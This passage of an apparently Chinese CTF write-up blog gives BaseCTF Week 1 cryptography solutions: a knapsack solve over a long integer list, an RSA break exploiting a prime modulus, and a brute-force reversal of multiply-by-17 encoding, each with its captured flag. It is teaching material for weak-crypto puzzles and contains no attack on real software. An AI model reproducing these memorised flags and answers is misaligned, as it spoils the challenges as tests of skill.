class="number">100524774903368088338735495212617525628101069016243368191042349062731422745652851141040067275932170134907320208205726289799197848585810532178559348960204294517902672414604810447030596048</span>, <span class="number">27814678376250636475963101212563090069738325215292874239553841311037561288624279025540601779796471707609056593491462913915467359662214011975515860736192625178250236017806638891058352841</span>, <span class="number">6146583639189016851959336110111529802617165794295583668085087256400497268514196451801697302172354876150306785802188833007655768181472221094475392274540015787948511952367768046413009035</span>, <span class="number">1972647620592074216061102097901025152958921034850117568363055778941629490654706191168761681590445732321415108675787531563680577749629570660705072798303247953275401784690900022657739322</span>, <span class="number">371444236734952267365204917912482218024760669256564601735746557802172061599306636753624221981211002583971063750448869544186339158302695225083644994003958727288476784454648096424712122</span>, <span class="number">122254251587569792335530528509722911970032904171801982862469794399827245263786995733489731913997837358853070479769024383526380208988565918719151600653752397319872277146128837497328015</span>, <span class="number">37286085540618400296289156352820709922577362907484951458689730829327977274283958429361031670068907334172105855310654077662912181145565822690393824208950538512990718744603086462751297</span>, <span class="number">8960386121829638279311227577342777825734976587843199435094340053720338004424184197136819101116475086084110882985205105967675766957208204488229410580925549838579346975088433058825112</span>, <span class="number">2276020215301107373585539745757682715066838555468744061772014192384015274014672056309929648681686089838637957127768944113418121587630588726390948566064269910008396907056486696440621</span>, <span class="number">607349939368134408551415861865227396073824635286316486245465114777775395388058059102705505424561001490318248134384090100571125911216424062773005875309952406284203774537367839133285</span>, <span class="number">119036276576206703263155095063111697848826207711313825926870015597766389307963670003146886377762517538032971265642879985310317695973899218804472784113163457901422724084711780785647</span>, <span class="number">42030777748108550530459203444475857940945563824576240738615672332753050069206966495014628929275783847295884969372071131041457167837216841146848083118096773135990284469263324779443</span>, <span class="number">7801996642301319152692691810553695688255137357013588495692283033031549008190374987427339686278893185224986120367594016951691992507271905708595080902010159659368839867860433342236</span>, <span class="number">2208574074019210752518459502962754515153645798717698412888529548015314931730564928870825878207969197632997431492713572137381185806543942907257429896476484304820878553303138599159</span>, <span class="number">768875672280773738301803816415515519067859985949784777815605972358140605222957399855931295900483405997209014872309627261455336173608212560504792804732406159988744626008190591642</span>, <span class="number">213430837881757766520777720690227709564760977311522001626864091515991137423909703305978776728094360822736833235760061066314816749758660033547207607953805341923438394772222356568</span>, <span class="number">82360211831711259567147082155555818156999516949891879514305397375226376936714506922756403002876731807095740268483307937613566131364594612432398098476300712735589147781570183292</span>, <span class="number">17749505352232170648277795567698933594199437689182764405380407013992895289676270195878470798816715217377777574478356564936400974585960088437473753598924064324383361905659789789</span>, <span class="number">3427214394932046144638723931330597473316067571098072662894954825121393877991928319931449114219100671521983554547487355301825989691873309784465316768877146988849237541879345997</span>, <span class="number">1033902507229521469775736346351634090020261583833297661608844489398831364552754846127512235344097362890795464047384509362185144853214501000183283440093026203459311568816825264</span>, <span class="number">224896235915885231383021605802223120291823571580780275950317681857821908865357784480256946962966353978144999197255874549242776446126658379098611152585008158970159741029928166</span>, <span class="number">46029158819241197707530664166476597494824578315547299718547883731820892091315435238631987346971891025923179798692039448953613556744177038196467650472219486883115951311114343</span>, <span class="number">11947866502696456680811378187645438096064991719463034800178755900009558951200835612294081250719346343143340755576335021624771970543003065673188450976052831967872919086392740</span>, <span class="number">2920182352645954475250456149302161189384947754266138653194940049989939156554780361528842542799077656577372777863627070726368904843252451856963117841700429655465449705784298</span>, <span class="number">641622426678020294248348183140299041659157650855760105808225416711044677800278294044700367798760043786235745613510792462327964867426046011657009528106413572140156175050547</span>, <span class="number">139954746021857963632941471710740997948822448809029403690252968784849647633362222415971470082427919553489814062772632095710992183657541577740542585479640231081279442703729</span>, <span class="number">26951287563812328009402867445459718346022404035671471571180747182520664735617063468580188663385794364598479725800534646437082877207222254951262061856164914161401031069085</span>, <span class="number">7533585444288704788707326472044821719148563540561950589462107215132713320228676563974287003223326227564110259498308322080055316439031345783355395296729881160340610419798</span>, <span class="number">2276681583409260736395242645263289467585348662731848036224090877214770286189504748163492790260653720049576572250410962278647838121717162502347694787530301107754917965930</span>, <span class="number">474556448905745036966775435479094252142291985759634322576584740921367165655972599891226896859675668151114091970232772247346351748955558953513984653925641106869750480713</span>, <span class="number">127434337967780172994097939061090682233760718060985516805855544997040535343689397647620215878303719159525314116562161004671399396862283153119456440081266677387394513825</span>, <span class="number">26958440398830097157570752848820597974607321452122682350667898050790790872944229259301257843111978215025542048968699222294492807645241856446964337776714971381969501071</span>, <span class="number">5543555284065922229007474385783130130141655633965977061928013317537397727717406514000700955159647395591026117082092382033235800387850239860460046217510413778741145568</span>, <span class="number">1234762639172810584930296374422356813288496696923257612102992994614585199225028932857122231293467541131628736229833789522239025569090130126077017761481761935075168095</span>, <span class="number">355466248406445302867530536283270751070714127588124044114582631609659246249339560304163152323418724390561360227173698743244037301264764126798143323643968965204937509</span>, <span class="number">72700233281268425015457883799224003903351225804106120865021630177680188790291132871915896124460090399131402188231983457135950533458784941828330878270977967060216148</span>, <span class="number">17316325779212303492370685449752299828026183539683998725619992507954441121758510621171086796417805607101134043617316264832615245565516418608812080799316990851625705</span>, <span class="number">4045793926070659592750134404331599438619282956075192844401269281007613550701517318190039173492631001707043977026685514125253560526115949503328595814800145874763660</span>, <span class="number">711093850172488751248536015688936346283846062295071944527029992467516277719725837096755918337587878576030222851749327532666344838291776707230618144013255672878802</span>, <span class="number">265627118033654696712457079751401631255125309014812639375295118794146799198801006240800873274048170518660448221821727034749291649708953722421725907035286053353872</span>, <span class="number">56397799026942637682063511042055387061218525595156363606895648399263418939712512484112089481484737116602512227228360835774657959685026627558074305176995845647003</span>, <span class="number">14485314789957973511455116454157965523985421493897618644045918045972073878396047755360530791556364199120111093825046698573687446383611922050184839529827282440392</span>, <span class="number">3550955573839595298078922255066479093374448121222507459840552079059417076208499387361330875700156148993662311858100125881757983588374422578671684157194578005699</span>, <span class="number">845394743568277367630651838202283372116209637644259875312243046465466486130071115873693547193074995290146894807692302774606698607144257685615262061054213977420</span>, <span class="number">157730148886711208861332893525227881346167845596707482474187376786153504516831765170538422967044056418676212271368775137847308449974344069982254963969728576186</span>, <span class="number">54972881967813310263623651713923315210166704822071760933248319000133464676004646169143078394020203091841106960137380702725337793156762085219469872257140065395</span>, <span class="number">10729618624425932454603285350456338562675184367958955898413107388221142096410983819404349570576694967179369846493834859543515755779034404675292796271503098978</span>, <span class="number">2442709998183758153870663320358670148543830566673551209180788899834647749860789589565309923762896818608005296106561164431377898506019097822580641263331814899</span>, <span class="number">651590036376284619471743663785818577107718418313829721360265583261583596100827943422638184205536113868285291626431841044058974804223249221103868269005376657</span>, <span class="number">114607798091152645971169174208076386390725220406372401915445980825934238917993417913942451617626679858301802459311641056076814238046173194524157303256038150</span>, <span class="number">39902529162554510030314089494503111747276505091248405060746015077422014506338256115473236342993594864048856417342484086620483648018566663638691082167406896</span>, <span class="number">7696036409658331229292571646244718273466046087174912598857625566056708582171413470987556822776798859431848832604237853020082821687940873973792941059899704</span>, <span class="number">2124793715529138812294972358553948624813291392446651644830711957681124971135340690294893448419315140942986852615187098678211216431027229098600530178187333</span>, <span class="number">658384832743376570742078380839633081933064245096557997421967190397377225701314189557712470669358349072689322858650074777626830988174808516744296032918846</span>, <span class="number">207441722934708037755237631720378642887937120813748348023809687455047615244353892880515039372882445336126456679753369371480841621878413386189854105557570</span>, <span class="number">46120989258570141716198175239164426659655378133453203231982537688000264558364343582463401621127725393877459942514087061448921695021828660135004811441077</span>, <span class="number">8188249463851855339650372248928765967441086033339032675901168172673586603869217763697984051550480433177801759541580074823902608731330486865652085135044</span>, <span class="number">2937142904794524692633847174299189664745670816742834573158221153146769098153095208026269794290966633578370921776670433893125934429015973900770183068397</span>, <span class="number">733124926365921400367689082582974550222406734787055535605162687013854196685186803977001257147200683812867023143593280536908792623212121135546302252718</span>, <span class="number">163278402453599131564496240174531690514528227885644439879148727669198836851619817419582703102053351987308732391369947772790306377652049104175405389057</span>, <span class="number">30247650270830046327693354982611104496891052070130966758534212809812843335592964533296290766840765263207385481421035739473846342013342141171267959427</span>, <span class="number">10078130422940933339521748812234495734268808180137214319132992860890442263439248960992021699437860319479050323778157839338656439168670198619111143719</span>, <span class="number">2468880502161574512996214909253394046701372930781084997897282377444297398943413058653731620475409298189864459900922031063170285510529204509174601472</span>, <span class="number">607074026100427506196023135076433955199278835550407310798426497629249872001552107547116229667872950481628543662982580322754725261269013849906534673</span>, <span class="number">132740473918237042219883376937810235079740145884708583638955667277623190279830437900121550989480157388767941856419463040395910600481643868918183256</span>, <span class="number">31718510456640085593521631697634193356173604238387825664787000835659167411973149050707246808351118400835035866343214347384616969135648635282147931</span>, <span class="number">7013023279079169100512494613396045516189395791014739872279083083144940194186933569894993097804928064121695159201540587912810973411497923430308118</span>, <span class="number">1771185586112090213616219590319917086599723206748079096836927259082387415598439340193771966567407719988569555116938671184047274203791682665544114</span>, <span class="number">397374970256811388188624914624139083024782079917643579178513419907217677561151325006437923068157587425558261984085274694860016959461272906962347</span>, <span class="number">79357052331733760410996870451429462826990142415371259214931967883012213322689987714484368914655142353136743730816759493623445282698964105194007</span>, <span class="number">18024995037150399824560351471574943556440673595591374226442857720036395804619368162299007566488606118476181051500800792556435843369345814420200</span>, <span class="number">3672082813534614033824027501205682677746304198256311647201407880518658491065244877413146229442328563967205873649123895823789401080903874966058</span>, <span class="number">884390448367024106697977520994089114652140177186827650340642302821550463666402143376715117683073225822100147575051185094558637911933790548300</span>, <span class="number">188239732756327819809744123998273956373038631188535307108080455432157193929576323356894115167616675699250266852372722398883063108283627629142</span>, <span class="number">33288603989729116913271536956952173835445978966530730095436444955036538722332958231617041802341417062090911709863572792283326143337721274355</span>, <span class="number">11485733967829072841907653505652765367596185911550254707130569392647462332893031105105058197515848740962693154105512628726167266984356020289</span>, <span class="number">2403399291804759683718697201628718853672014990022411946032431974098338948608647899389041474778909482165700212670301626696886803147288043249</span>, <span class="number">511319889754958068650171413169799880502913743237143323338990019288960892229714861654882544537650773480294037968794797914167989453965720824</span>, <span class="number">108151236227275669723663372909233127249406930188286111418173641508503812685900937356143956513296377001193855340520507635261983173020133040</span>, <span class="number">29238304319413057053313068686030250753447165587962843793828466785518433534702764546822180884428461976687744929459281379124786742084937021</span>, <span class="number">8710806082582848713173281808121766793059207164795295196447513451552342446919958461280536897422363560410120915054864290671091109422830007</span>, <span class="number">2960745852030782790607427333914261375033099283529370879973360161495226124203100530063141357601421786632355173585713266548540973431376582</span>, <span class="number">604226789553326438591187728019722484152820159976600984629527520901554123057786334839341626845330699593003318860611284025243121271706983</span>, <span class="number">182601602703012851376129630760230344746014108213070190831158648995503303041568836468914587260292443510296580408749988987988496769980026</span>, <span class="number">45452114165544367630569931330797239179068892066478030202246828842399491816831847850747717090783448434947452983100492335497009639567888</span>, <span class="number">17121905765418035275547423058447462707899580001255272989656046701474401090015657327101125412277786884745764423250530487272209339058447</span>, <span class="number">3774603297652275052121496733944137560240160153708941233671122697937317529256966828765637412706299259386179629160090242954994907929332</span>, <span class="number">1060720547441758622170146447289706124200025617853186951481807263542360257370083864882158715152433273118314629121456220166038646613297</span>, <span class="number">221968014150998259820244482577203245639303312867709655818056071267607816968641371724863025295597993367786164837699315327363092768373</span>, <span class="number">48882714266352303994499906166362680249387918980441207673706748487810074857456907593421757139320785593117603391693650930762966455968</span>, <span class="number">16202448926627445820838961561455164462246910065772244580677765363543397691542726082412061203163218760307389834156275979660359394394</span>, <span class="number">2956163682419868606126264117158250029934298756926288053091609992334385653684466888852763393290616941805759810929196668548734379973</span>, <span class="number">947743414350088412833104395509485078494688169216314527117041568424743421788079617145817207736081707175649820823460623353469499129</span>, <span class="number">184945524926843220565904193572688427321550948207655453104873607656563645624884025013598624332554709507217938881998831490973926770</span>, <span class="number">56091241819606834802888641120709675472905317085277369060569812131174812302014447128355020686805930142925377568700991226583887786</span>, <span class="number">11342476554725825973899273577573419030806527097049265365675861670559660391106730894000199354064208522140305551746468882526930218</span>, <span class="number">2402177443476249504669747634772796049517512708172380623039160322117732888388776939986309881254003733945369109368480598991083692</span>, <span class="number">779694676467776330674778030069618028430247798034244061629255618166403221248637754838157860401196252119142530084615889227008718</span>, <span class="number">279805151354990313327069866270353558845137298807826578854001581649814949600343606775647790956175906533124785285484676594205727</span>, <span class="number">71475104043185673882357779032282210215441549654529833915666511795774890652222328738683786126978390540777959958334867072773903</span>, <span class="number">17943539235945014339231354558742830502206047263873390682998140665294407299445224663761111928004278268665005924991145357190559</span>, <span class="number">4644026442647371851471373522652996931494883964189143247893482852205071445064380253582641516905658082237627505163407862645664</span>, <span class="number">1409644155578077661014560265925065735043498896729842671302999827395230787557009605337358883198670470099670153973385533319619</span>, <span class="number">323096734145812043063935925026236730750028036642046031570292345040624480525514361785469029998625026693350812690921739556759</span>, <span class="number">66490109788591511799221912380563668027716398810544644123382175383682357229245468554339935745239347569290928368121481198120</span>, <span class="number">12656292548243054261915436732277320096081079272327419007058490559709461117024442299280829706525636594720337557745657188367</span>, <span class="number">3391681366475824837488092758715214360838073187075047614113065989329609613896833473414068502642149439870471691863634629122</span>, <span class="number">1171517421153263625675697419132009454686117107914679030403775353063155717395912120634642665620725468223446139999071277507</span>, <span class="number">283703308943571467555327320427163735194765821724187323544643973406396459830945519805247147967066979142358739388094356677</span>, <span class="number">68051202286065965847502158995164914066216566669074127539650532219749577216638549042842244710379907101440823172129217941</span>, <span class="number">13657391854992511108591836048816405373941724899814769682716923188133130484869138365241075289816576384008939639840185236</span>, <span class="number">2883783693644859186835460708048379333567917588026714123591585397758887606304693027342351097912118721134282551369664243</span>, <span class="number">799049413981621014519709854919842048905323519892313665984919603393072653972864233067257746232644641382453549991205564</span>, <span class="number">167323486728516981799615013230008131717839880066330604897780052101994505570227406902019168715315935265773326851501787</span>, <span class="number">36720821966367632835200966450053402442515187808387796741238632349642200514749124280117021313827183586060369692397742</span>, <span class="number">9231349669963900651759770670625059190403421490616649578654575717995018536450416781815824036250202148465899261409814</span>, <span class="number">1782108859562682583955834770956766771890605266822317978330465547356702234978432274339716401371413673051273821401047</span>, <span class="number">403558799957529775306903388246707975744649346938130151765107472774892029713724284184220469230250620098654222513187</span>, <span class="number">113610170795802770344935864787382347027936273326387062416574602249889635787754346617875788451115772661826280534521</span>, <span class="number">32055073799513070460127524930885397197257512625854036561086683809899754909243064094359316603350553060664792782962</span>, <span class="number">9032924934526196049960770072668776382612241442724751839457302023155061259650364280524549081144893790536494565021</span>, <span class="number">2017862790729520323724155794794272872202696299996991444268875260039652843714149080734888358373743815054699872032</span>, <span class="number">641989462295283575733593919337192523868529607267791351139020713122159499889249625918896534847416953951571198300</span>, <span class="number">128576036185681041874919451733195397084174018792730182604376427967040903314850718633946179141568345684439398601</span>, <span class="number">40372047007036282320578970360805818319565465833073029617047122562052782556856211341854983376957243551410081742</span>, <span class="number">12690329041364261531787667832647179962305068888653710915257119208086200721695307184639464428289081103144163044</span>, <span class="number">3561839882694824398822284966776610177573484210494611237706713481725365094327241161248699081978241602830178596</span>, <span class="number">1199938132534089466501994820759235969832300222872622731608847912038243599132645129289586987692172765041057363</span>, <span class="number">324263436138121201088338125064781061780131145213294921711639118717892670326681104392825089385185080492440484</span>, <span class="number">68312903907509568411987755477707268100466381276451833349595552008166402404491773244111478626617324226539375</span>, <span class="number">17644820024620964580235818915132121042107943132825887368503777072488644953818352369186661300059264368686602</span>, <span class="number">3506176982938427175993147412444392161707218066658168782915638022559988465482121419504891010260766228901318</span>, <span class="number">1066127911891872518349397911557440606663336809214920827134975446907327509548040800613223772158827103310018</span>, <span class="number">226192414853873324160991825316404956087309825251607871786471768482769238181939189651359979648153657144702</span>, <span class="number">45868481610678874924581859998825662511897619432776149300471637861901025934649825592930301843850526560482</span>, <span class="number">13790618957198333318923230203705633437848971510707911225277092048085966476634360389032477412386316672075</span>, <span class="number">2577037700547459915849817513069936580425167358802123937052546118913600453224885074049561249688358836828</span>, <span class="number">907316011507113096967526321014989153923826069305244388586962072152306166058795915708345202709057953005</span>, <span class="number">257655812504204080571300921288974779044004152926402846615682864861219686480771224251979519937398150021</span>, <span class="number">49251062839756470728155099947305937498531111600022908848098152154867828870296984401906907127621922967</span>, <span class="number">18003086576459067165101290934987020831800807030229687007784917512221091664668503037255416369751058381</span>, <span class="number">3931602604129427365537886268681901399659904652265314628365560645602702305389347981284422957262198925</span>, <span class="number">1024271243554288667730540660664163792950639594042380266463713922650987059456833218457318808946966091</span>, <span class="number">264399551848126394660403560510401104363977298239470868728218368941030448200247464958990623172466340</span>, <span class="number">91991457278474569364064153570190123603908094841658212918408559703533962838464377716405517361239718</span>, <span class="number">22400319343956127928389329988299680966797095025488025868862978943959831082472834977311350142227326</span>, <span class="number">4054933925260064992644878588484342847457594792015796931877255389193313381697255433801823807489993</span>, <span class="number">1563931191287550417926830376062569859269361644002382824954373333292013041945346281280805769011292</span>, <span class="number">343600935590550484460351833584964172817805330710096798788745676605896512317351762955463013247649</span>, <span class="number">63176100013413022744650607325631187438860827337150751513958540819158680919377176592820951694123</span>, <span class="number">21461895060447171957232560518498142689748550789857829420960180353599240337920080298104122001920</span>, <span class="number">5835166770039346718590125171268445418773015279002775708686914119655634953623824713817863325421</span>, <span class="number">1583080965885530423876853196443645139416147803583378489670913938148126388391843537295818940207</span>, <span class="number">392027882718889629138666367076395194013822284370187648811904450742968357888850048132707951624</span>, <span class="number">84773060845038628419287336751649666625561226450930810787040749330985148718455599359011719538</span>, <span class="number">20913329354023188439880157138010537207897970146456506518137268768176475768733880753458923347</span>, <span class="number">4311750805563893138689876217833463788577851583828477282279295599052168675043703275872499679</span>, <span class="number">853899685398867377607396879875326827128843982112866203167371936104484725330862023846437598</span>, <span class="number">177330267045126383717093581983187474779454406408201086941455408963372790398670000549267776</span>, <span class="number">53143647775046286515978817675952110384368487980955438888997975610432428251415059859228454</span>, <span class="number">10991259161865360146194812310045803635018376660538575719261554366173833834812335245373835</span>, <span class="number">4056765217542521288464908532309700817396778995632736813131981648221349714370388148127516</span>, <span class="number">804624166261647601714189486709310419472244009530705820922420809512944365943834561839229</span>, <span class="number">221209387838524016717980366851546408106123634464083126244578703480033718962945353384984</span>, <span class="number">44893426704852156297812963470050296993434463573414592728231358819460836492051444088309</span>, <span class="number">15097276880249572944791099185953982641176811310343688646744220558627388586126270884093</span>, <span class="number">3177547688411513827329112344846258118128928380413096551275296685970663730887380521208</span>, <span class="number">707854681966281587817169996379236533896940250761506339446186239585936846532007717960</span>, <span class="number">123430766712269269314015844444108981877839453341743217081639119599583069918979135631</span>, <span class="number">42727196484340883716428235074652898935106385756024360939020725643288512665432787419</span>, <span class="number">9795023686113954751639542218587813833546340682044130681106706094735594753449446343</span>, <span class="number">3333589652095912448402556417544763364674016013042330262047943676041390880358346180</span>, <span class="number">947455010581251264347248926744940190279860580467728251791365397084078291899564124</span>, <span class="number">268670018298046298594544067046438306285322924770238391595093977430279476868065240</span>, <span class="number">78094390422018068485749659108183366278694042747549744891971134188665400412950020</span>, <span class="number">18124918094760916369648633132238959364840331932070152769613739914614309846704031</span>, <span class="number">4241888706533610079212359644998015902376872441583028817350629704555219530448753</span>, <span class="number">1292864973632566395230008219224138571254648896695439011761255646000025705327047</span>, <span class="number">268748278858999280597005392622004242197468731403889200124673378952297248513604</span>, <span class="number">88509143938000904019404561563568039020388387086033088264015176342184836107961</span>, <span class="number">20193371122440969904693011623640235956008535236609083989796068753247319156032</span>, <span class="number">4038600180280215891988824178178278280373636611246918842044528278230564207261</span>, <span class="number">1107150907782944887892399335890628523766269912586346493641592121812091723247</span>, <span class="number">210625186186013434779241292600805721380717453215450496819990522919652412749</span>, <span class="number">52953910211550391007013147620224873533688473472101985821194501496064403298</span>, <span class="number">9097555221706291288743269232756819233000414675958515393645941994120605160</span>, <span class="number">3429649093597174301305755373533641028744892761855146399462989664052400884</span>, <span class="number">741640028601865737636894538300654069448568041784703865806900024636263858</span>, <span class="number">137111267993711698795554790044192357770629382096307382022924712860324239</span>, <span class="number">38616149627736424773611788634842959989120382193171456026729095563767415</span>, <span class="number">9431485520373346422889960992205054090491173749526200420980321805553690</span>, <span class="number">1992952778532071559000019699416705938136688490627773967637839059076015</span>, <span class="number">574194788106589082411518870360486672683587224354718671901248024476268</span>, <span class="number">102609620640057348696515220693089742351613040750651566890644962920462</span>, <span class="number">36268823254475267212915191076327557136209959811616783925907478300982</span>, <span class="number">7567999544690811975942075962292580482677577353162367723788797894980</span>, <span class="number">1874140527739488453786828468118120241481575966337619572680165251377</span>, <span class="number">453914446353792760975691426663914252084437914832347163629988619705</span>, <span class="number">165150650733410175597931630292861667062273243834275274945484646602</span>, <span class="number">34566163119600685975060339689452757045437083897698838710019239494</span>, <span class="number">7694148541008402030841753047537726531717215585386379181283251145</span>, <span class="number">1697576884850411658454847805622249167935227079092758267244556419</span>, <span class="number">472437807783179983228633641986010243354676995634705949446120356</span>, <span class="number">119409918075506001971427759705853133156186846892920587610723175</span>, <span class="number">25613263424766799565203791718547119460962423676387668942984591</span>, <span class="number">7805142960598461841091346841458786166600096726425068620929337</span>, <span class="number">2767230135693902128766236987544547378777436388091785064756910</span>, <span class="number">689644486314086496286093830416975206144754872092432108597436</span>, <span class="number">138642086125227682870831666630271950088954885603515871632201</span>, <span class="number">30047434693445231347602467117028303851832764185641774643468</span>, <span class="number">6851801387424175873694354145711254327404855789285230103013</span>, <span class="number">2120042874205307146695207067554609162977513984517631857617</span>, <span class="number">490320105846897857421254356104910632681008002313418940471</span>, <span class="number">126323731373804665276167034060996983366300068355660603173</span>, <span class="number">21699921539905324453875345006818945922412432384306278913</span>, <span class="number">7939681050823987735942326816454304705408373515598927024</span>, <span class="number">1704054406000164917101338955641076586996654015897777293</span>, <span class="number">674629720702507360892410918497513853241707768110535720</span>, <span class="number">130116804903893330957629746403630277914984408897684191</span>, <span class="number">36586674897705341032938585410676119549859764313014514</span>, <span class="number">6820517853488553816157069373430435510514248629408934</span>, <span class="number">1940615831245060580576779381334292194461763717429719</span>, <span class="number">486407487540373443078130965659847688641455681092783</span>, <span class="number">115503902548715291215146001384729209189201342203617</span>, <span class="number">20726453501406140054607926221786392225949497849620</span>, <span class="number">5795586010156766459954451266198423523738902544440</span>, <span class="number">1894126095992857664160110316211206136427948391401</span>, <span class="number">400235284644456465531456917507977101554184036138</span>, <span class="number">96821039379669584765064498053975819680674844391</span>, <span class="number">23003305579401059533778299981921977893360385917</span>, <span class="number">5228073966664279351555893540080524011514115962</span>, <span class="number">1242198234479925081489833339665036257581784830</span>, <span class="number">412185918978837707936146917867270887000813745</span>, <span class="number">100133634343775138722999743130814482251294603</span>, <span class="number">26059544917887755330857182088221243972088111</span>, <span class="number">5139528748995372887990321340679356174733638</span>, <span class="number">1253542354308041615766358708614160342158058</span>, <span class="number">255695244303425264981809526736239333102982</span>, <span class="number">61808370933695923699986081041674755242751</span>, <span class="number">12426096507290278206573602748929564597975</span>, <span class="number">2986453750810080523307169404271220297061</span>, <span class="number">642144302488057714162005557670195083334</span>, <span class="number">130361391592026886001154254666792730817</span>, <span class="number">38722902212652057786773086799878934378</span>, <span class="number">7692285091800305362911294817569041066</span>, <span class="number">2668441901840977427307689562983863761</span>, <span class="number">627879703191450992712744583653335581</span>, <span class="number">143466848278452388635765854137055267</span>, <span class="number">40114449315047293082657646359855538</span>, <span class="number">9604649217508319090540717981276261</span>, <span class="number">2160954625898663094838587676686854</span>, <span class="number">663518655289550974870054172122371</span>, <span class="number">165231181091826810616798470843406</span>, <span class="number">32017505733146837917121936265672</span>, <span class="number">6710170503572414769550988030906</span>, <span class="number">2193907060628154300461720427652</span>, <span class="number">655138594818423378286082953437</span>, <span class="number">128372286376670762441323321515</span>, <span class="number">34081674525017606572942142473</span>, <span class="number">9410152783640368288366142632</span>, <span class="number">2828735859241558188208098320</span>, <span class="number">551007171562149788272788426</span>, <span class="number">123790351812017402954987183</span>, <span class="number">26171709615346256252881994</span>, <span class="number">5974406115827778237616062</span>, <span class="number">1129305631130982975444977</span>, <span class="number">309305180419035303006618</span>, <span class="number">63076647774929269450546</span>, <span class="number">17802308053095636943505</span>, <span class="number">5708739899619810440888</span>, <span class="number">1717642617243788103954</span>, <span class="number">487452007321104273269</span>, <span class="number">128040514304008259695</span>, <span class="number">22395338754966061650</span>, <span class="number">6980614247696882509</span>, <span class="number">1954726203330249242</span>, <span class="number">521378690601084559</span>, <span class="number">136837526017031961</span>, <span class="number">29173740577404415</span>, <span class="number">7191768065683254</span>, <span class="number">1621292657659019</span>, <span class="number">549037231011822</span>, <span class="number">141224784287699</span>, <span class="number">28266584508619</span>, <span class="number">8568210839573</span>, <span class="number">1730361037440</span>, <span class="number">343914088335</span>, <span class="number">79692432578</span>, <span class="number">29986725790</span>, <span class="number">6384194185</span>, <span class="number">1319027283</span>, <span class="number">483793159</span>, <span class="number">103505140</span>, <span class="number">22103086</span>, <span class="number">7280487</span>, <span class="number">2401760</span>, <span class="number">411716</span>, <span class="number">143073</span>, <span class="number">37097</span>, <span class="number">10436</span>, <span class="number">1884</span>, <span class="number">649</span>, <span class="number">134</span>, <span class="number">40</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">1</span>]</span><br><span class="line">c= <span class="number">2488656295807929935404316556194747314175977860755594014838879551525915558042003735363919054632036359039039831854134957725034750353847782168033537523854288427613513938991943920607437000388885418821419115067060003426834</span></span><br><span class="line">backpack(a, c)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{2c4b0c15-3bee-4e4a-be6e-0f21e44bd4c9}</p><h4 id="Week1-babyrsa"><a href="#Week1-babyrsa" class="headerlink" title="[Week1] babyrsa"></a>[Week1] babyrsa</h4><p>题目使用一个素数p作为n，此时有<code>φ(p) = p - 1</code>，那么<code>d ≡ e^(-1) mod (p-1)</code>，则<code>m ≡ c^d mod p</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># φ(p)</span></span><br><span class="line">phi = p - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># d</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, long_to_bytes(<span class="built_in">pow</span>(c, d, p)).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{7d7c90ae-1127-4170-9e0d-d796efcd305b}</p><h4 id="Week1-十七倍"><a href="#Week1-十七倍" class="headerlink" title="[Week1] 十七倍"></a>[Week1] 十七倍</h4><p>爆破原来的字符得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> (i * <span class="number">17</span>) % <span class="number">256</span> == c:</span><br><span class="line">                flag += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">cipher = [</span><br><span class="line">    <span class="number">98</span>, <span class="number">113</span>, <span class="number">163</span>, <span class="number">181</span>, <span class="number">115</span>, <span class="number">148</span>, <span class="number">166</span>,  <span class="number">43</span>,   <span class="number">9</span>,  <span class="number">95</span>,</span><br><span class="line">    <span class="number">165</span>, <span class="number">146</span>,  <span class="number">79</span>, <span class="number">115</span>, <span class="number">146</span>, <span class="number">233</span>, <span class="number">112</span>, <span class="number">180</span>,  <span class="number">48</span>,  <span class="number">79</span>,</span><br><span class="line">    <span class="number">65</span>, <span class="number">181</span>, <span class="number">113</span>, <span class="number">146</span>,  <span class="number">46</span>, <span class="number">249</span>,  <span class="number">78</span>, <span class="number">183</span>,  <span class="number">79</span>, <span class="number">133</span>,</span><br><span class="line">    <span class="number">180</span>, <span class="number">113</span>, <span class="number">146</span>, <span class="number">148</span>, <span class="number">163</span>,  <span class="number">79</span>,  <span class="number">78</span>,  <span class="number">48</span>, <span class="number">231</span>,  <span class="number">77</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">decrypted_flag 